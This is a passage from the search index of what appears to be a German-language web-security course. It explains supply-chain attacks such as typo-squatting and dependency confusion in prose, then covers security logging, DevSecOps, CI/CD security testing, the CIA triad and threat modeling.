bzw. Verbesserungspotential.</p> <p>Hierbei kann es sich z.B. um nicht-funktionale Elemente wie Logging handeln, oder aber auch um Aspekte wie Programmiersprache-inh\u00e4rente Muster, die einen negativen Einfluss auf die Sicherheit der Webapplikation besitzen k\u00f6nnen.</p>"},{"location":"introduction/integration/#using-components-with-known-vulnerabilities","title":"Using Components with Known Vulnerabilities","text":"<p>Die Verwendung vorhandener und gewarteter externer Komponenten wie Bibliotheken oder Frameworks besitzt sicherheitstechnisch viele Vorteile: man kann von Fehlern anderen lernen bzw. muss das Rad nicht neu erfinden.</p> <p>Damit wird allerdings auch der Nachteil eingekauft, dass eine Verwundbarkeit innerhalb einer integrierten externen Komponente automatisch auch eine Verwundbarkeit der eigenen Applikation impliziert. Daher m\u00fcssen aktiv und regelm\u00e4\u00dfig verwendete Komponenten auf bekannte Schwachstellen hin \u00fcberpr\u00fcft, und ggf. die betroffenen Komponenten aktualisiert werden. Falls \u00fcber eine externe Komponente eine Schwachstelle ,,eingefangen\u201d wird, wird dies Supply-Chain Attack genannt: der Angriff erfolgt nicht direkt gegen die Applikation selbst, sondern \u00fcber die inkludierten Komponenten, quasi dem Zulieferer (engl. Supply Chain).</p> <p>Um den Aufwand dieser \u00dcberpr\u00fcfungen zu reduzieren und damit optimaler-weise deren Frequenz zu erh\u00f6hen gibt es automatisierte Tools wie den OWASP Dependency-Check oder OWASP Dependency-Track. Diese analysieren automatisch Projekte auf Dependencies (z.B. \u00fcber Ruby Gemfiles, NPM package-lock.json Files, Maven Projektbeschreibungen), extrahieren automatisch dependencies und korrelieren diese mit \u00f6ffentlichen Verwundbarkeitsdatenbanken. Wird hier nun eine potentiell anwendbare Schwachstelle gefunden, wird der Entwickler via Email oder Slack notifiziert.</p>"},{"location":"introduction/integration/#typo-squatting-und-dependency-confusion","title":"Typo-Squatting und Dependency Confusion","text":"<p>Bei Supply-Chain Angriffen plazieren Angreifer Schadcode zumeist in neuen Versionen bereits verwendeter Bibliotheken. Der Angreifer muss also Zugriff auf den Source Code einer h\u00e4ufig verwendeten Bibliothek erlangen. Die Geschichte zeigt, dass dies durchaus einfacher als gedacht ist.</p> <p>Ein Angreifer kann Supply-Chain Angriffe auch ohne Erlangen eines bestehenden Projektes durchf\u00fchren. Bei Typo-Squatting Angriffen kopiert der Angreifer eine bestehende Bibliothek, reichert diese um Schadcode an, und l\u00e4d diese unter einem neuen Namen hoch. Der neue Name ist sehr \u00e4hnlich dem urspr\u00fcnglichen Namen der Bibliothek gew\u00e4hlt, der Angriff zielt darauf ab, dass das Opfer beim Integrieren der eigentlich gew\u00fcnschten Bibliothek sich vertut oder vertippt und dadurch die falsche Bibliothek samt Schadcode inkludiert.</p> <p>Ein weiterer Angriffsvektor ist Dependency Confusion. Hier entwickelt das Opfer eine Software, die sowohl \u00f6ffentliche als auch interne (private) BBibliotheken verwendet. Der Angreifer kennt den Namen einer internen Bibliothek und l\u00e4d eine Schadsoftware mit diesem Namen auf ein \u00f6ffentliches Paketverzeichnis (welches von der Opfersoftware verwendet wird) hoch. In Abh\u00e4ngigkeit von der verwendeten Programmiersprache, der verwendeten Paketverwaltung und dessen Konfiguration k\u00f6nnen zwei potentielle Schwachstellen auftreten:</p> <ol> <li> <p>\u00d6ffentliche Quelle werden gegen\u00fcber privaten Quellen bevorzugt: es    wrid nun der Schadcode aus dem \u00f6ffentlichen Repository geladen.</p> </li> <li> <p>Bei der Auswahl der Bibliothek aus internen und \u00f6ffentlichen Quellen    ,,gewinnt\u201d das Paket mit der h\u00f6chsten Version. In diesem Fall muss    der Angreier nur ein Paket mit einer h\u00f6heren Versionnummer in das    \u00f6ffentliche Repository hochladen um seinen Schadcode in die    Opfersoftware zu integrieren.</p> </li> </ol>"},{"location":"introduction/integration/#insufficient-logging-and-monitoring","title":"Insufficient Logging and Monitoring","text":"<p>Diese Schwachstelle wurde im Jahre 2017 neu bei den OWASP Top 10 aufgenommen. Es handelt sich hierbei weniger um eine Schwachstelle w\u00e4hrend der Exekution, sondern eher um die Schaffung der M\u00f6glichkeit nach einem Angriff aufgrund der vorhandenen Log-Dateien das Vorgehen des Angreifers und die betroffenen Daten zu erkennen.</p> <p>Folgende groben Anforderungen an das Log-System werden gestellt:</p> <ul> <li> <p>Es muss mit verteilten Applikationen umgehen k\u00f6nnen. Eine   Webapplikation ist potentiell auf mehrere Computersysteme verteilt   (Webserver, Applikationsserver, Datenbankserver). Die Logdaten der   gesamten Systeme sollten an einer Stelle aggregiert werden.</p> </li> <li> <p>Es muss die Integrit\u00e4t der Logdaten sch\u00fctzen: ein Angreifer sollte   keine M\u00f6glichkeit besitzen, die geloggten Daten zu beeinflussen.   W\u00fcrden z.B. Logdaten direkt am Webserver gespeichert werden, k\u00f6nnte   ein Angreifer der den Webserver gehackt hat, ebenso die Logdaten   modifizieren. Dies impliziert, dass der Log-Server \u00fcber eine genau   definierte API erreichbar sein sollte.</p> </li> <li> <p>Es muss die Vertraulichkeit der Daten sch\u00fctzen. Da der Logserver   Detailinformationen \u00fcber betriebliche Abl\u00e4ufe speichert, m\u00fcssen   diese Daten mindestens ebenso sicher wie die urspr\u00fcnglichen Daten   gespeichert werden.</p> </li> <li> <p>Das Log-System muss M\u00f6glichkeiten zur nachtr\u00e4glichen Auswertung der   gesammelten Daten bieten. Bonuspunkte, wenn man ein automatisiertes   Monitoring mit dem Log-System betreiben kann.</p> </li> </ul> <p>Die jeweiligen loggenden Systeme sollten alle sicherheitsrelevanten Events (z.B. Input Validation Fehler, Authentication Fehler, Authorization Fehler, Applikations-Fehler) an das zentrale Log-System schicken. Diese Daten sollen um Business Process Events angereichert werden. Diese dienen dazu, relevante gesch\u00e4fts-relevante Prozesse und Ereignisse mit den Sicherheits-Events zu korrelieren. Weitere Datenquellen sind z.B. Anti-Automatisierungssysteme, welche Brute-Force Angriffe erkennen, Datenverarbeitungssysteme (k\u00f6nnen auch Batch-Systeme sein, die z.B. einen Daten-Export oder Backups ausf\u00fchren) und alle direkt und indirekt involvierten Services, wie z.B. Mailserver, Datenbankserver, Backupdienste. Falls vorhanden, sollten die Loginformationen sicherheitsrelevanter Komponenten (HIDS, NIDS, WAFs) auf jeden Fall inkludiert werden.</p> <p>Bei dem Loggen sollte darauf geachtet werden, dass, wenn m\u00f6glich, standardisierte Log-Formate wie CEF oder LEEF verwendet werden. Dadurch wird das Konvertieren der jeweiligen Datenquellen auf ein gemeinsames Format vermieden.</p> <p>Welche Daten sollten pro Event erfasst werden?</p> <ul> <li> <p>Wann hat sich der Vorfall ereignet? Bei einer verteilten Applikation   sollte hier darauf geachtet werden, dass Timestamps die Zeitzone   beinhalten (und auch auf Zeitumstellungen achten). Grundlage f\u00fcr das   temporale korrelieren von Events ist es, dass alle beteiligten   Server eine idente Systemzeit besitzen (z.B. durch die Verwendung   von ntp).</p> </li> <li> <p>Wo ist das Event passiert? Hierf\u00fcr k\u00f6nnen Systemnamen, Servicenamen,   Containernamen oder Applikationsnamen verwendet werden.</p> </li> <li> <p>F\u00fcr welchen Benutzer ist das Event passiert? Hier k\u00f6nnen   Systembenutzer (mit denen das Service l\u00e4uft) oder feingranular der   gerade eingeloggte Benutzer protokolliert werden.</p> </li> <li> <p>Was ist passiert? Dies wird immer applikations- und event-spezifisch   sein. Viele Systeme verwenden zumindest eine idente Klassifizierung   der Wichtigkeit des Events.</p> </li> </ul> <p>Die Verwendung von personenbezogenen Daten kann das Logging verkomplizieren. Ein Unternehmen sollte klare Regeln erstellen, welche Daten geloggt werden und, falls notwendig, Anonymisierung oder Pseudonymisierung verwenden um sensible Daten zu maskieren. Ein \u00e4hnliches Problem tritt auf, wenn Log-Informationen zwischen Unternehmen geteilt werden sollte (z.B. im Zuge eines Informations-Lagebilds). Da diese Daten unter anderem personen-bezogene Informationen als auch Betriebsgeheimnisse inkludieren k\u00f6nnen, wird davon meistens abgesehen.</p> <p>Die erfassten Daten sollten im Zuge einer Auswertung verwendet werden. Hier werden h\u00e4ufig \"normale\" Texteditoren in Verbindung mit regul\u00e4ren Ausdr\u00fccken verwendet. Fortgeschrittene L\u00f6sungen w\u00e4ren ELK-Stacks, Kibana und Logstash und z.B. Splunk.</p> <p>In einem \u00e4hnlichem Umfeld arbeiten SIEM-Systeme (Security Information and Event Management). Diese werden zumeist als weiterer Schritt nach Log-Management angesehen. Zus\u00e4tzlich zum Log-Management wird zumeist auch Security Event Management (real-time monitoring), Security Information Management (long-term storage of security events) und Security Event Correlattion durchgef\u00fchrt.</p>"},{"location":"introduction/integration/#devops-und-tooling","title":"DevOps und Tooling","text":"<p>DevOps ist eine neuere Str\u00f6mung die versucht, Development und Operations zu vereinen.</p> <p>Webapplikationen werden zumeist von Entwickler erstellt und dann einem Administratoren-Team zur Installation \u00fcbergeben. Teilweise wird die Applikation auch von den Entwicklern installiert und dann von den Administratoren langfristig gewartet. In gr\u00f6\u00dferen Unternehmen wird die Installation und Wartung teilweise auf zwei unterschiedliche Administratorenteams aufgeteilt.</p> <p>Dies f\u00fchrt zu getrennten Teams mit getrennten Wissensstand und kann im worst-case auch z.B.nkerdenken \u2014 ,,us vs. them\u201d\u2014 f\u00fchren. Diese Trennung behindert den Informationsfluss und verhindert, und f\u00fchrt k\u00fcnstliche Schranken im Verantwortlichkeitsgef\u00fchl ein (,,die Admins sind daf\u00fcr verantwortlich\u201d). Im Fehlerfall f\u00fchrt dieses Bunkerdenken auch zum Herum schieben der Verantwortung zwischen Parteien.</p> <p>DevOps versucht nun, wie der Name schon sagt, die Trennung von Entwicklung (,,Development\u201d) und Administration (,,Operations\u201d) zu beenden. Prinzipiell ist DevOps mehr eine Philosophie/gelebte Firmenkultur die stark von der Kultur der kontinuierlichen Verbesserung (z.B. Kanban in Japan) gepr\u00e4gt ist. Bei der Umsetzung bindet es st\u00e4rker Entwickler in klassische Operations-Bereiche wie Deployment ein.</p> <p>Eine gute Beschreibung ist, dass DevOps agile Entwicklungsmethoden mit agilen Deployment kombiniert.</p>"},{"location":"introduction/integration/#agile-methoden","title":"Agile Methoden","text":"<p>Agile Methoden sind ein neueres Projektmanagement-Muster, welches im Agile Manifesto folgende Grunds\u00e4tze definiert:</p> <ul> <li>Individuals and interactions over processes and tools</li> <li>Working Software over comprehensive documentation</li> <li>Customer collaboration over contract negotiation</li> <li>Responding to change over following a plan</li> </ul> <p>Umgesetzt f\u00fchrt dies zumeist dazu, dass monolithische Projekte in kleine minimale Teile transformiert werden. Diese werden dann, in Reihenfolge der Kundenprioitisierung, abgearbeitet und regelm\u00e4\u00dfig der Fortschritt mit dem Kunden besprochen. Im Zuge des Projektes kommt es h\u00e4ufiger zu \u00c4nderungsw\u00fcnschen, diese k\u00f6nnen dann als weiteres Teilprojekt/Schritt inkludiert werden, die Geschwindigkeit des Teams kann \u00fcber Projektdauer immer genauer eingesch\u00e4tzt werden.</p> <p>Damit die Projektsteuerung bei agiler Methodik funktioniert, darf ein einmal erledigter Schritt/Problem nicht immer wieder (durch Bugs) kosten verursachen. Aus diesem Grund wird hier stark auf automatisierte Tests gesetzt. Sofern diese Tests erfolgreich durchlaufen wird davon ausgegangen, dass das Produkt funktioniert. Der master oder production-Branch der Software sollte niemals fehlerhafte Testcases besitzen, kann daher jederzeit an den Kunden ausgeliefert werden.</p>"},{"location":"introduction/integration/#anwendbarkeit-agiler-methoden","title":"Anwendbarkeit agiler Methoden","text":"<p>Agile Methoden sind nat\u00fcrlich nicht f\u00fcr alle Projekte geeignet und werden eher bei Startup-Projekten bzw. explorativen Projekten angetroffen. Bei Anwendungen mit hoher Sicherheitsrelevanz gibt es Zeitweise sehr genau ausspezifizierte Lasten-/Pflichtenhefte, diese m\u00fcssen dann auch dementsprechend umgesetzt werden.</p>"},{"location":"introduction/integration/#infrastructure-as-code","title":"Infrastructure as Code","text":"<p>Ein Grundsatz Agiler Methoden ist ,,Working Software over comprehensive documentation\u201d.</p> <p>Der Fokus auf Working Software anstatt auf Dokumentation schl\u00e4gt sich auch bei dem Deployment (dem Installieren der Software) nieder: dies wird zumeist automatisiert als Skript durchgef\u00fchrt und nicht als Dokumentation ausgeliefert (und entspricht dadurch bereits dem DevOps-Gedanken).</p> <p>Da im Zuge von Agilen Methoden versucht wird m\u00f6glichst fr\u00fch und m\u00f6glichst h\u00e4ufig lauff\u00e4higen Code beim Kunden bereitzustellen (bzw. als Testservice dem Kunden zur Verf\u00fcgung zu stellen) passieren Installationsvorg\u00e4nge regelm\u00e4\u00dfig. Um hier nun Redundanzen zu vermeiden (bzw. um Konfigurationsfehler zu verhindern) wurden hier (historisch betrachtet) Installationsanweisungen immer st\u00e4rker durch automatisierte Skripts ersetzt. Danach wurden dezidierte Deploymentstools (wie z.B. capistrano) f\u00fcr das Setup der Applikation konfiguriert und verwendet. Im Laufe der Zeit wurden diese Tools nicht nur f\u00fcr die Applikation selbst, sondern auch f\u00fcr Datenbanken, Systemservices, etc. angewandt; die historische Evolution sind mittlerweile dezidierte Frameworks die zum Setup der Systeme dienen (wie z.B. Puppet, Chef oder Ansible).</p> <p>Ein weiterer Vorteil dieses Ansatz ist, dass die verwendete Konfiguration innerhalb der (hoffentlich) verwendeten Source Code Versionierung automatisch versioniert und Ver\u00e4nderungen dokumentiert werden. Dies erlaubt das einfachere Debuggen von Regressionen.</p>"},{"location":"introduction/integration/#continuous-integration-and-continuous-delivery","title":"Continuous Integration and Continuous Delivery","text":"<p>Die Verwendung von Tests zur Sicherung der Softwarequalit\u00e4t ist ein essentieller Bestandteil Agiler Methoden. Dem Kunden werden regelm\u00e4\u00dfig neue Programmversionen mit erweiterten Features zugestellt und anhand des Kundenwunsches neue Features selektiert und im n\u00e4chsten Programmier-Sprint hinzugef\u00fcgt. W\u00fcrden Features fertig gestellt werden, die Fehler beinhalten und m\u00fcsste man nachtr\u00e4glich diese Fehler immer wieder neu korrigieren, w\u00fcrde dadurch die Geschwindigkeit des Programmierteams stark leiden. Um dies zu verhindern, werden massiv Softwaretests geschrieben, die \u00fcberpr\u00fcfen ob die gew\u00fcnschten Kundenfeatures ausreichend implementiert wurden. Diese Tests werden aufgerufen, bevor ein neues Feature in die, dem Kunden \u00fcbermittelten, Version integriert wird. Auf diese Weise wird automatisch eine Kontrolle der Qualit\u00e4t durchgef\u00fchrt.</p> <p>Um sicher zu stellen, dass diese Tests auch wirklich aufgerufen werden, werden diese Tests automatisiert aufgerufen. Dies wird im Zuge des Continuous Integration Prozess durchgef\u00fchrt: nach jeder \u00c4nderung wird versucht, die Software zu bauen (builden) und anschlie\u00dfend werden die vorhandenen Tests ausgef\u00fchrt. Falls ein Fehler auftritt, wird der betroffene Entwickler sofort notifiziert.</p> <p>W\u00e4hrend Unit-Tests prim\u00e4r auf das Testen von Funktionen abzielen, werden auch statische Source Code Tests integriert. Diese \u00fcberpr\u00fcfen die Qualit\u00e4t des gelieferten Codes (z.B. Coding Guidelines) und sind n zweites Standbein automatisierter Tests.</p> <p>In einem finalen Schritt kann auch Continuous Delivery angewandt werden, dies ist quasi die Ausdehnung des Continuous Integration Prozesses auf das installieren der fertigen Software (in einer Testumgebung oder, im Extremfall, direkt beim Kunden). Hier kann nach erfolgtem Bauen und Testen der Software diese auf Knopfdruck (oder vollautomatisiert) in einem Test- bzw. Produktivsystem eingespielt werden. Der Fluss von der Entwicklung \u00fcber die Kontrolle bis zur Installation ist somit vollzogen. Falls dies alles durch den Entwickler konfiguriert wurde, kommt kein klassischer System-Administrator im Prozess vor. Damit gibt es keine Teilung der Kompetenzen und Verantwortung mehr, der Schritt zu DevOps ist vollzogen.</p>"},{"location":"introduction/integration/#devops-and-security","title":"DevOps and Security","text":"<p>Die Abk\u00fcrzung DevOps besteht aus Development und Operations, das Wort Security kommt dabei nicht vor.</p> <p>Sicherheit in DevOps zu integrieren ist ein \u00e4hnliches Problemfeld wie das urspr\u00fcngliche DevOps-Problem der Trennung zwischen Admins und Entwicklern. Wenn die Sicherheitsverantwortlichen ein getrenntes Team sind, dann ergibt sich wieder Bunkerdenken, Wissensinseln als auch ein fehlendes Verantwortungsgef\u00fchl.</p> <p>Es wird nun Versucht das Sicherheitsteam in das DevOps-Team zu integrieren und dadurch Security als gemeinsame Verantwortung zu etablieren. Die Grundidee ist sch\u00f6n in folgendem Satz ausgef\u00fchrt: ,,Security is built into the System instead of being applied upon the finished product\u201d.</p> <p>H\u00e4ufiger wird zwischen verschiedenen Ans\u00e4tzen um Security einzubauen unterschieden:</p> <ul> <li> <p>DevOpsSec: es wird ein Produkt entwickelt, danach wird die   Administration durchgef\u00fchrt. Final wird Security gew\u00e4hrleistet: ein   Beispiel daf\u00fcr w\u00e4re es, dass nach Inbetriebnahme das Security-Team   Security-Patches einspielt. Das klassische Beispiel w\u00e4re das   Anpassen und der Betrieb von Standardsoftware.</p> </li> <li> <p>DevSecOps: zuerst wird entwickelt, danach wird Security betrachtet   und danach die Administration fortgesetzt. Dieser Ansatz wird   aktuell (2019) h\u00e4ufig gesehen und ist zumindest besser als die   Security generell zu ignorieren. Ein Beispiel hierf\u00fcr w\u00e4re es, die   Inbetriebnahme von der erfolgreichen Durchf\u00fchrung einer   Sicherheits\u00fcberpr\u00fcfung abh\u00e4ngig zu machen.</p> </li> <li> <p>SecDevOps: betrachtet initial die Security (z.B. schon w\u00e4hrend der   Planung der Software). Dadurch durchdringt Security die gesamte   Entwicklung als auch die Administration.</p> </li> </ul> <p>Security bewirkt meistens einen Mehraufwand f\u00fcr die Entwickler. Um diesen Mehraufwand zu begrenzen, wird auch hier (im DevOps-Spirit) stark auf Automatisierung gesetzt. So werden z.B. Sicherheitstests als automatisierte Testprogramme implementiert und w\u00e4hrend der Testphase innerhalb des Continuous Integration Prozesses ausgef\u00fchrt. Dadurch werden die Sicherheitstests automatisch Teil des Abnahme-/Verifikationsprozess und durchdringt auf diese Weise die gesamte Entwicklung.</p>"},{"location":"introduction/integration/#automatisierung","title":"Automatisierung","text":"<p>Um die konsistente und regelm\u00e4\u00dfige Verwendung der Sicherheitstests zu enforcen wird die Ausf\u00fchrung der Sicherheitstests stark automatisiert. Dieses Kapitel f\u00fchrt h\u00e4ufig verwendete automatisierte Tests an:</p>"},{"location":"introduction/integration/#automated-unit-tests","title":"Automated Unit Tests","text":"<p>Unit Tests sind minimale Tests die ein Feature verifizieren. Die meisten Software-Frameworks erlauben es, Tests auf Controller-Ebene zu schreiben f\u00fcr deren Ausf\u00fchrung die Applikation nicht als gesamtes gestartet werden muss.</p> <p>Alternativ kann ein Unit-Test z.B. als einfaches Shellskript, Python-Requests2 skript oder als JUnit-Test unter Verwendung von Java-Bibliotheken durchgef\u00fchrt werden. In dem Fall muss im Zuge der Tests ein Webserver gestartet werden, diese Tests sind daher zeitaufwendiger.</p> <p>Integrations-Tests testen die Funktionalit\u00e4t des Gesamtsystems. Hierbei kann unter anderem auf Browser-basierte Frameworks wie Selenium oder Capybara zur\u00fcckgegriffen werden. Durch diese wird ein oder mehrere Benutzer mittels eines virtuellen Browsers simuliert \u2014 die Tests beschreiben die Benutzernavigation und -operationen innerhalb der Webseite. Hier kann man z.B. zwei Benutzer simulieren: ein Benutzer legt Daten an und ein zweiter Benutzer versucht (invalid) auf diese Daten zuzugreifen. Diese Tests sind um einiges Ressourcen- (da ein Webbrowser und Webserver ben\u00f6tigt wird) als auch zeitaufwendiger und werden daher zumeist nicht nach jeder Sourcecode-\u00c4nderung durchgef\u00fchrt.</p>"},{"location":"introduction/integration/#static-source-code-tests","title":"Static Source Code Tests","text":"<p>Analog zur Analyse der Qualit\u00e4t des Source Codes (w\u00e4hrend des normalen DevOps-Prozesses) k\u00f6nnen auch Tools zur statischen Analyse des Source Codes inkludiert werden. Diese pr\u00fcfen den Source Code auf bekannte Programmiermuster und -fehler die sicherheitsrelevante Konsequenzen besitzen k\u00f6nnen.</p> <p>Hier gibt es meistens Programmier- und Framework-abh\u00e4ngige Tools wie z.B. bandit f\u00fcr Python, Brakeman f\u00fcr Ruby on Rails und SpotBugs f\u00fcr Java. Eine Ebene \u00fcber diesen Einzeltools funktioniert OWASP SonarCube. Dieses Tool kann intern die gesamten erw\u00e4hnten Subtools anwenden und besitzt auch Plugins um mittels OWASP dependency-check eine \u00dcberpr\u00fcfung der verwendeten Abh\u00e4ngigkeiten (z.B. Bibliotheken) auf Schadcode hin durchzuf\u00fchren.</p>"},{"location":"introduction/integration/#dynamic-application-scans","title":"Dynamic Application Scans","text":"<p>Zus\u00e4tzlich zur statischen Source-Code Analyse kann man auch dynamische Scans verwenden. Hierbei wird zumeist die Applikation in einer Testumgebung (z.B. staging) automatisiert installiert und danach mittels automatisierter Web Application Security Scanner gescripted ein Test durchgef\u00fchrt. Im Falle einer Regression werden die Entwickler benachrichtigt. Beispiele hierf\u00fcr w\u00e4re z.B. das automatisierte Scannen einer Applikation mittels OWASP ZAP unter Zuhilfename des full-scan.py-Skripts.</p>"},{"location":"introduction/integration/#reflektionsfragen","title":"Reflektionsfragen","text":"<ol> <li> <p>Was ist der Grundgedanke dabei, DevOps und Security zu verbinden?</p> </li> <li> <p>Welche Sicherheitsma\u00dfnahmen k\u00f6nnen im Zuge von SecDevOps    automatisiert durchgef\u00fchrt werden? Erl\u00e4utere die jeweiligen    Ma\u00dfnahmen.</p> </li> <li> <p>Wie kann w\u00e4hrend der Continuous Integration (CI) oder Continuous    Delivery (CD) auf die Sicherheit eines Softwareprodukts R\u00fccksicht    genommen werden?</p> </li> <li> <p>Was sind Supply-Chain Angriffe und wie k\u00f6nnen diese geschehen?</p> </li> </ol>"},{"location":"introduction/security_as_process/","title":"Sicherheit als Prozess","text":"<p>Sicherheit kann nicht alleine stehen, man kann nicht \u201cSicherheit programmieren\u201d sondern nur \u201ceine Applikation sicher programmieren\u201d. Sie ist keine One-Shot Operation die einmalig vor Projektende durchgef\u00fchrt wird, sondern muss w\u00e4hrend der gesamten Laufzeit der Softwareentwicklung beachtet werden. Ein typisches (fiktives) Beispiel: ein Softwareprojekt wurde als klassisches Wasserfall-Model geplant. Nach drei Jahren Laufzeit sollte das Projekt abgeschlossen sein, ca. sechs Monate vor Ende ist ein Penetration-Test der Software vorgesehen \u2014 die sechs Monate sollten ausreichend sein um potentiell gefundene Schwachstellen auch zu beheben. Es entwickelt sich leider eine typische \u201cSoftwareprojekt\u201d-Geschichte: die Fertigstellung verz\u00f6gert sich, schlussendlich kann der Penetration-Test erst eine Woche vor Go-Live durchgef\u00fchrt werden. Nat\u00fcrlich werden kritische Fehler gefunden \u2014 aufgrund der Verz\u00f6gerungen und der Mehrbelastung der Entwickler war zu wenig Zeit f\u00fcr Sicherheits- bzw. Qualit\u00e4tssicherheitsma\u00dfnahmen vorhanden. Der Launch-Zeitpunkt kann aufgrund zugekaufter Werbung nicht mehr verschoben werden, was nun? Wie kann man diese Situation vermeiden?</p> <p>Professionelle Softwareentwicklung verwendet meistens einen (semi-)standardisierten Software Development Lifecycle (SDLC), es gibt verschiedene Auspr\u00e4gungen hier Security einzubringen. Zumeist werden in den jeweiligen Phasen sicherheitsrelevante Inhalte hinzugef\u00fcgt:</p> <ul> <li> <p>Security Training des Personals</p> </li> <li> <p>Requirements and Risk Analysis</p> </li> <li> <p>Threat Modeling</p> </li> <li> <p>Secure Coding Guidelines, Secure Coding Checklists</p> </li> <li> <p>Security Testing Guides, Pen-Tests</p> </li> <li> <p>Vulnerability Management and Incident Response</p> </li> </ul> <p>Einige dieser Punkte werden in den Folgekapiteln etwas genauer erl\u00e4utert.</p>"},{"location":"introduction/security_as_process/#requirementsanalyse","title":"Requirementsanalyse","text":"<p>In der Requirementsanalyse sollte bereits Security ber\u00fccksichtigt werden. Dies wird meistens unterlassen, da Security-Anforderungen non-functional[1] requirements sind. Negative Auswirkungen dieses Vers\u00e4umnis sind fehlende Awareness f\u00fcr Security, nicht ausreichende Ressourcen (Zeit, Personal, Budget) und schlussendlich fehlende Sicherheit im resultierenden Softwareprodukt.</p>"},{"location":"introduction/security_as_process/#schutzenswertes-gut","title":"Sch\u00fctzenswertes Gut","text":"<p>Eine zentrale Frage einer Sicherheitsdiskussion ist, was \u00fcberhaupt besch\u00fctzt werden sollte. Diese Operationen oder Daten werden h\u00e4ufig Sch\u00fctzenswertes Gut genannt. Beispiele f\u00fcr diese sind z.B. sensible Benutzerdaten, ein essentieller Gesch\u00e4ftsprozess aber auch immaterielle Werte wie die Reputation eines Unternehmens, dessen Aktienkurs oder intellectual property.</p> <p>H\u00e4ufig wird die sog. CIA-Triade zur Klassifizierung verwendet. Hierbei stehen die einzelnen Buchstaben f\u00fcr einen sch\u00fctzenswerten Bereich: Confidentiality, Integrity und Availability. Diese werden in der folgenden Tabelle genauer erl\u00e4utert:</p> Buchstabe Name Beschreibung C Confidentiality no unauthorized access to data I Integrity no unauthorized or undetected[2] modification A Availability Verf\u00fcgbarkeit der Daten <p>Die jeweiligen Bereiche sind verwandt, Availability kann stark von der Integrit\u00e4t der Daten abh\u00e4ngig sein. Beispiel: wenn eine Fahrzeitauskunft zwar als Webservice verf\u00fcgbar ist, aber den Daten nicht vertraut werden kann, ist das Gesamtservice aus Usersicht wahrscheinlich nicht available.</p> <p>Bei realen Projekten ist die Einsch\u00e4tzung immer vom Kunden abh\u00e4ngig. Ein IT-System ist immer in die Kundenlandschaft integriert und daher k\u00f6nnen klassische IT-Fehler unterschiedliche Auswirkungen besitzen. Z. B. wird einem reinen Online-Shop die Availability wichtiger sein, als einem physikalischen Shop der nebenbei einen kleinen Onlineshop betreibt; teilweise werden Fehler durch organisatorische Ma\u00dfnahme (Buchhaltung) abgefangen, etc.</p>"},{"location":"introduction/security_as_process/#sicheres-design","title":"Sicheres Design","text":"<p>Bei der Erstellung der Software Architektur/des Software Designs sollte auf Sicherheit geachtet werden. Um die Ziele der CIA-Triad zu erf\u00fcllen, empfehlt OWASP folgende Elemente bei der Analyse eines sicheren Designs zu beachten:</p> <ul> <li> <p>Authentication</p> </li> <li> <p>Authorization</p> </li> <li> <p>Data Confidentiality and Integrity</p> </li> <li> <p>Availability</p> </li> <li> <p>Auditing and Non-Repudiation</p> </li> </ul> <p>Die ersten vier Punkte stellen die Anforderungen aus der CIA Triade dar.</p> <p>Audit Logs dienen u.a. dazu, um im Fehlerfall die Schwachstelle zu erkennen als auch den Schadfall einzugrenzen (z.B. welche User sind in welchem Umfang betroffen?). Unter Non-Repudiation versteht man die Nicht-Abstreitbarkeit: falls eine Operation von einem Benutzer durchgef\u00fchrt wurde, sollte nachtr\u00e4glich auch verifizierbar sein, dass diese Operation auch wirklich von dem jeweiligen Benutzer in Auftrag gegeben wurde.</p>"},{"location":"introduction/security_as_process/#threat-modeling","title":"Threat Modeling","text":"<p>Threat Models dienen zur systematischen Analyse von Softwareprodukten auf Risiken, Schwachstellen und Gegenma\u00dfnahmen. Durch die Verwendung eines formalisierten Ablaufs wird die gleich bleibende Qualit\u00e4t der Analyse gew\u00e4hrleistet.</p> <p>Bei der Analyse sollten vier Hauptfragen gestellt und beantwortet werden[3]:</p> <ol> <li> <p>What are you building?</p> </li> <li> <p>What could go wrong?</p> </li> <li> <p>What should you do about those things that could go wrong?</p> </li> <li> <p>Did you do a decent job of analysis?</p> </li> </ol> <p>Bevor auf diese einzelnen Bereiche kurz eingegangen wird sollte noch kurz erw\u00e4hnt werden, dass Threat Models im Laufe der Zeit sehr umfangreich und daher schwer zu verstehen werden. Im Worst-Case wird es so \u201caufgebauscht\u201d dass es nicht mehr effektiv verwendbar ist und schlussendlich nur noch \u201ctote\u201d Dokumentation darstellt. Ein guter Mittelweg zwischen Detailiertheit und Lesbarkeit ist essentiell f\u00fcr ein verwendbares Threat Model.</p>"},{"location":"introduction/security_as_process/#what-are-you-building","title":"What are you building?","text":"<p>Folgende Bereiche sollten durch das Threat Model abgedeckt werden:</p> <ul> <li> <p>Threat Actors: wer sind die potentiellen Angreifer. Dies ist wichtig   zu wissen, da dadurch eine bessere Ressourceneinsch\u00e4tzung (wie viel   Zeit bzw. finanzielle Ressourcen kann ein Angreifer aufbringen?)   m\u00f6glich ist. Ebenso wird dadurch gekl\u00e4rt, ob auch Insider-Angriffe   m\u00f6glich sind.</p> </li> <li> <p>Sch\u00fctzenswertes Gut: vor welchen Angriffen hat ein Unternehmen Angst   bzw. welche Daten sind sch\u00fctzenswert. Die Dokumentation   sch\u00fctzenswerter G\u00fcter ergibt Synergie-Effekte zu der notwendigen   DSGVO-Dokumentation.</p> </li> <li> <p>Grundlegende Sicherheitsannahmen: im Laufe eines Softwareprojektes   werden Produktentscheidungen aufgrund des aktuellen Wissensstand   getroffen. Hier sollten diese Entscheidungen dokumentiert[4] werden.   Beispielsweise k\u00f6nnte f\u00fcr embedded systems eine schw\u00e4chere   Verschl\u00fcsselungstechnik gew\u00e4hlt worden sein, da die vorhandene   Hardware nicht potent genug f\u00fcr ein besseres Verfahren war. Durch   die Dokumentation der Annahmen k\u00f6nnen diese periodische auf ihre   Haltbarkeit hin \u00fcberpr\u00fcft werden. Die Dokumentation dieser Annahmen   ist auch essentiell im Falle des Ausfalls eines Entwicklungsteams.</p> </li> <li> <p>Scope: welche Bereiche unterliegen der Sicherheitsobacht des   Entwicklers? Ist die Datenbank, der Webserver, etc. Teil des   Projekts oder werden diese von externen Personen bereitgestellt?</p> </li> <li> <p>Komponenten und Datenfl\u00fcsse: die Applikation wird in einzelne   Komponenten dekonstruiert. Der Datenfluss (samt Klassifizierung der   betroffenen Daten) zwischen den Komponenten wird meistens mittels   Datenflussdiagrammen (data flow diagrams, DFDs) dargestellt.</p> </li> </ul>"},{"location":"introduction/security_as_process/#what-could-go-wrong","title":"What could go wrong?","text":"<p>Basierend auf den Datenflussdiagrammen werden potentielle Risiken und Schwachstellen identifiziert. H\u00e4ufig wird hierf\u00fcr STRIDE 